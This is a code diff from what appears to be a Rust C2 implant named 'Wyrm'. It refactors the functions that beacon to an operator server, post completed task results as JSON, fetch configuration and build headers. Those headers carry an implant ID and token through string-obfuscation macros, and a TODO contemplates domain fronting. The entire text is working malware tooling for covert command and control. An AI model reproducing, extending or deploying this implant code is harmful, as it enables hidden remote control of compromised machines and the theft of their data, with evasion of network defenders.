@@ -50,11 +50,13 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, minreq::Erro
     let response = if implant.completed_tasks.is_empty() {
         http_get(formatted_url.clone(), headers)?
     } else {
-        http_post(formatted_url.clone(), implant, headers)?
+        http_post_tasks(formatted_url.clone(), implant, headers)?
     };
 
     let mut tasks: Vec<Task> = vec![];
 
+    // If response was not OK; then just sleep. In the future maybe we have a strategy to exit after x
+    // bad requests?
     if response.status_code != 200 {
         #[cfg(debug_assertions)]
         println!(
@@ -79,7 +81,7 @@ fn http_get(url: String, headers: HashMap<String, String>) -> Result<Response, m
     minreq::get(url).with_headers(headers).send()
 }
 
-fn http_post(
+fn http_post_tasks(
     url: String,
     implant: &mut Wyrm,
     headers: HashMap<String, String>,
@@ -101,10 +103,8 @@ fn http_post(
     let serialised_post_body: Vec<u8> =
         serde_json::to_vec(&completed_tasks).expect("could not ser");
 
-    let host = url.trim_start_matches("http://").split('/').next().unwrap();
-
     minreq::post(&url)
-        .with_header("Host", host)
+        // .with_header("Host", host) -> TODO domain fronting?
         .with_header("Content-Type", "application/json")
         .with_headers(headers)
         .with_body(serialised_post_body)
@@ -124,7 +124,7 @@ fn generate_generic_headers(
 
     let _ = headers.insert(sc!("WWW-Authenticate", 74).unwrap(), implant_id.to_owned());
     let _ = headers.insert(sc!("User-Agent", 42).unwrap(), ua.to_string());
-    let _ = headers.insert(sc!("Authorization", 92).unwrap(), security_token.to_owned());
+    let _ = headers.insert(sc!("authorization", 92).unwrap(), security_token.to_owned());
 
     headers
 }
@@ -170,7 +170,7 @@ pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, minreq:
     let sec_token = &implant.c2_config.security_token;
     let ua = &implant.c2_config.useragent;
     let headers = generate_generic_headers(&implant.implant_id, sec_token, ua);
-    let response = http_post(formatted_url.clone(), implant, headers)?;
+    let response = http_post_tasks(formatted_url.clone(), implant, headers)?;
 
     //
     // We get back some settings from the C2
